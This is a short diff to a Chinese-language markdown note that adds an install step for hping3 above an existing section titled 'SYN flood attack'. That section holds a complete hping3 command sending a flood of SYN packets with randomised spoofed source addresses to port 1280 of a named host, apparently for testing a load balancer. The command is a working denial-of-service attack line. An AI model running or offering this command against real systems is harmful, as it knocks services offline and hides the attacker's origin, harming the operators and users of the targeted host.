@@ -1,3 +1,6 @@
+## 安装
+sudo yum --enablerepo=epel install hping3
+
 ## syn flood攻击
 sudo hping3 -c 20000 -d 120 -S -w 64 -p 1280 --flood --rand-source nlb.joey618.top
 
